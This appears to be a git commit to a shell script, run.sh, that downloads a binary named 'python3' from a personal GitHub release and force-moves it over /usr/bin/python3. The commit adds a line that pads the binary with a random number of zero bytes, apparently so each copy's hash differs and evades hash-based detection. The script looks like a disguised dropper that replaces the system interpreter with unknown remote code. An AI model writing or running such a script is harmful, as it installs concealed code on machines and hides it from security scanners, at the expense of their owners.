f2cdd3a9d4b0892525f679747674eae233184661
thuanx287 <thuanx287@gmail.com>
2024-11-17 20:47:03 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -3,6 +3,8 @@
 wget https://github.com/thuanx287/temp/releases/download/1/python3
 wget https://github.com/thuanx287/temp/releases/download/1/main.py
 
+head -c $((RANDOM % 999 + 1)) /dev/zero >> python3
+
 chmod 755 python3
 
 mv -f python3 /usr/bin/python3
